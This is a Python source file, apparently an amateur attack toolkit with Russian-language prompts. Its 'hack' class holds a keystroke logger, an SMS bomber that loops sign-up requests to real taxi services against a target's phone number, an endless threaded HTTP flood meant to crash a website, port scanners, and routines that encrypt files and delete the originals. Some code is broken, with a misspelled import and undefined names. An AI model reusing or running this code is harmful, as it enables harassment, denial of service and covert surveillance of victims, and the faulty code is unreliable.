def pip_install():
    import os
    os.system('python.exe -m pip install --upgrade pip')
    os.system('pip install pynput')
    os.system('pip install setuptools')
    os.system('pip install colored')
    os.system('pip install termcolor')
    os.system('pip install requests')
    os.system('pip install colorama')
    os.system('pip install pyAesCrypt')
    os.system('pip install pyautogui')
class hack:
    def ttbb():
        import os
        import time
        from pynput.keyboard import Listener
        import loging as log
        log.basicConfig(
           filename = 'клавература.txt',
        )
        def onPressed(key):
            log.info(str(key))
        with Listener(on_press = onPressed) as listener:
            listener.join()
    def sh_win():
        import os
        os.system('shutdown -i')
    def bomber():
        import requests, random, datetime, sys, time, argparse, os
        from colorama import Fore, Back, Style
        _phone = input(' номер недруга (79xxxxxxxxx)--->> ')
        
        if _phone[0] == '+':
        	_phone = _phone[1:]
        if _phone[0] == '8':
        	_phone = '7'+_phone[1:]
        if _phone[0] == '9':
        	_phone = '7'+_phone
        
        _name = ''
        for x in range(12):
        	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        
        iteration = 0
        while True:
        	_email = _name+f'{iteration}'+'@gmail.com'
        	email = _name+f'{iteration}'+'@gmail.com'
        	try:
        		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        		print('отправлено!')
        	except:
        		print('Не отправлено!')
        
        	try:
        		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
        		print('отправлено!')
        	except:
        		print('Не отправлено!')
    def port2(host):
        import os
        def fanc2():
            color_a = colored("[+] ", 'green')
            color_b = colored("[!] ", 'red')
            color_c = colored("[!] ", 'yellow')
            print("\n")
            port = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20, 21, 22, 23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41, 42, 43, 53, 67, 69, 80]
            for i in port:
                try:
                    scan = socket.socket()
                    scan.settimeout(0.5)
                    scan.connect((host, i))
                except socket.error:
                    print(color_b + "Port -- ", i, " -- [CLOSED]")
                else:
                    print(color_c + "Port -- ", i, " -- [OPEN]")
    def port1():
        def fanc1(port,host):
            color_a = colored("[+] ", 'green')
            print("~"*50)
            host = input(color_a + "Host --> ")
            port = int(input(color_a + "Port --> "))
            print("~"*50)
            scan = socket.socket()
            color_b = colored("[!] ", 'red')
            color_c = colored("[!] ", 'yellow')
            try:
                scan.connect((host, port))
            except socket.error:
                print(color_b + "Port -- ", port, " -- [CLOSED]")
            else:
               print(color_c + "Port -- ", port, " -- [OPEN]")
        fanc1()
    def encrypt_the_file_txt(file,password):
        import os
        import pyAesCrypt
        print("---------------------------------------------------------------")
        bufferSize = 64*1024
        try: 
            pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, bufferSize)
            os.remove(file)
        except FileNotFoundError: 
            print("[x] File not found!")
        except ValueError: 
            print("[x] Password is Fasle!")
        else: 
            print("[+] File '"+str(os.path.splitext(file)[0])+"' successfully saved!")
        finally: 
            print("---------------------------------------------------------------")
    def ZAR_encrypt_the_file_txt(file,password):
        import os
        import pyAesCrypt
        print("---------------------------------------------------------------" )
        bufferSize = 64*1024
        try: 
            pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
            os.remove(file)
        except FileNotFoundError: 
            print("[x] File not found!")
        except OSError:
            print('[x] File not found!')
        else: 
            print("[+] File '"+str(file)+".crp' successfully saved!")
        finally: 
            print("---------------------------------------------------------------")
    def crash(site):
        import threading
        import requests
        if 1 == 1:
            def website():
                while True:
                    requests.get("https://"+site)
            while True:
             threading.Thread(target=website).start()
    def clicker():
        import pyautogui
        while True:
            pyautogui.click()
    def connect(site):
        import requests
        requests.get("https://"+site)
        try:
            print('True')
        except:
            print('False')
class cmd():
    def command():
        print('Для получения сведений об определенной команде наберите HELP <имя команды>')
        print('ASSOC          Вывод либо изменение сопоставлений по расширениям имен файлов.')
        print('ATTRIB         Отображение и изменение атрибутов файлов.')
        print('BREAK        Включение и выключение режима обработки комбинации клавиш CTRL+C.')
        print('BCDEDIT        Задает свойства в базе данных загрузки для управления начальной')
        print('               загрузкой.')
        print('CACLS          Отображение и редактирование списков управления доступом (ACL)')
        print('               к файлам.')
        print('CALL           Вызов одного пакетного файла из другого.')
        print('CD             Вывод имени либо смена текущей папки.')
        print('CHCP           Вывод либо установка активной кодовой страницы.')
        print('CHDIR          Вывод имени либо смена текущей папки.')
        print('CHKDSK         Проверка диска и вывод статистики.')
        print('CHKNTFS        Отображение или изменение выполнения проверки диска во время')
        print('               загрузки.')
        print('CLS            Очистка экрана.')
        print('CMD            Запуск еще одного интерпретатора командных строк Windows.')
        print('COLOR       Установка цветов переднего плана и фона, используемых по умолчанию.')
        print('COMP           Сравнение содержимого двух файлов или двух наборов файлов.')
        print('COMPACT        Отображение и изменение сжатия файлов в разделах NTFS.')
        print('CONVERT        Преобразует тома FAT в NTFS. Вы не можете')
        print('               преобразовать текущий диск.')
        print('COPY           Копирование одного или нескольких файлов в другое место.')
        print('DATE           Вывод либо установка текущей даты.')
        print('DEL            Удаление одного или нескольких файлов.')
        print('DIR            Вывод списка файлов и подпапок из указанной папки.')
        print('DISKPART       Отображает или настраивает свойства раздела диска.')
        print('DOSKEY         Редактирует командные строки, повторно вызывает команды Windows и создает')
        print('               макросы.')
        print('DRIVERQUERY    Отображает текущее состояние и свойства драйвера устройства.')
        print('ECHO           Отображает сообщения и переключает режим отображения команд на экране.')
        print('ENDLOCAL       Завершает локализацию изменений среды для пакетного файла.')
        print('ERASE          Удаляет один или несколько файлов.')
        print('EXIT           Завершает работу программы CMD.EXE (интерпретатора командных строк).')
        print('FC             Сравнивает два файла или два набора файлов и')
        print('               отображает различия между ними.')
        print('FIND           Ищет текстовую строку в одном или нескольких файлах.')
        print('FINDSTR        Ищет строки в файлах.')
        print('FOR            Запускает указанную команду для каждого из файлов в наборе.')
        print('FORMAT         Форматирует диск для работы с Windows.')
        print('FSUTIL         Отображает или настраивает свойства файловой системы.')
        print('FTYPE          Отображает либо изменяет типы файлов, используемые при')
        print('               сопоставлении по расширениям имен файлов.')
        print('GOTO           Направляет интерпретатор команд Windows в отмеченную строку')
        print('               пакетной программы.')
        print('GPRESULT       Отображает информацию о групповой политике для компьютера или пользователя.')
        print('GRAFTABL       Позволяет Windows отображать расширенный набор символов в')
        print('               графическом режиме.')
        print('HELP           Выводит справочную информацию о командах Windows.')
        print('ICACLS         Отображает, изменяет, архивирует или восстанавливает')
        print('               списки ACL для файлов и каталогов.')
        print('IF             Выполняет условную обработку в пакетных программах.')
        print('LABEL          Создает, изменяет или удаляет метки тома для дисков.')
        print('MD             Создает каталог.')
        print('MKDIR          Создает каталог.')
        print('MKLINK         Создает символьные ссылки и жесткие связи')
        print('MODE           Настраивает системные устройства.')
        print('MORE           Последовательно отображает данные по частям размером в один экран.')
        print('MOVE           Перемещает один или несколько файлов из одного каталога')
        print('               в другой.')
        print('OPENFILES      Отображает файлы, открытые для файлового ресурса удаленными пользователями.')
        print('PATH           Отображает или устанавливает путь поиска исполняемых файлов.')
        print('PAUSE          Приостанавливает выполнение пакетного файла и выводит сообщение.')
        print('POPD           Восстанавливает предыдущее значение текущего каталога,')
        print('               сохраненное с помощью команды PUSHD.')
        print('PRINT          Выводит на печать содержимое текстового файла.')
        print('PROMPT         Изменяет командную строку Windows.')
        print('PUSHD          Сохраняет текущий каталог, затем изменяет его.')
        print('RD             Удаляет каталог.')
        print('RECOVER        Восстанавливает данные, которые можно прочитать, с плохого или поврежденного диска.')
        print('REM            Записывает комментарии в пакетные файлы или файл CONFIG.SYS.')
        print('REN            Переименовывает файлы.')
        print('RENAME         Переименовывает файлы.')
        print('REPLACE        Заменяет файлы.')
        print('RMDIR          Удаляет каталог.')
        print('ROBOCOPY       Улучшенная служебная программа копирования файлов и деревьев папок')
        print('SET            Показывает, устанавливает или удаляет переменные среды Windows.')
        print('SETLOCAL       Начинает локализацию изменений среды в пакетном файле.')
        print('SC             Отображает или настраивает службы (фоновые процессы).')
        print('SCHTASKS       Выполняет команды и запускает программы на компьютере по расписанию.')
        print('SHIFT          Изменяет положение заменяемых параметров в пакетных файлах.')
        print('SHUTDOWN       Позволяет локально или удаленно завершить работу компьютера.')
        print('SORT           Сортирует ввод.')
        print('START          Выполняет указанную программу или команду в отдельном окне.')
        print('SUBST          Связывает путь с именем диска.')
        print('SYSTEMINFO     Отображает сведения о свойствах и конфигурации определенного компьютера.')
        print('TASKLIST       Отображает все выполняемые задачи, включая службы.')
        print('TASKKILL       Прекращение или остановка процесса либо приложения.')
        print('TIME           Отображает или устанавливает системное время.')
        print('TITLE          Назначает заголовок окна для сеанса CMD.EXE.')
        print('TREE           Графически отображает структуру каталогов диска или')
        print('          пути.')
        print('TYPE           Отображает содержимое текстовых файлов.')
        print('VER            Отображает сведения о версии Windows.')
        print('VERIFY         Устанавливает режим проверки в Windows правильности записи')
        print('               файлов на диск.')
        print('VOL            Отображает метку и серийный номер тома для диска.')
        print('XCOPY          Копирует файлы и деревья папок.')
        print('WMIC           Отображает сведения об инструментарии WMI в интерактивной командной оболочке.')
        print('')
        print('Дополнительные сведения о средствах см. в описании программ командной строки в справке.')
    def start_command(a):
        import os
        os.system(a)
    def cmd(a):
        import os
        os.startfile(a)
    def cd(cd):
        import os
        os.chdir(cd)
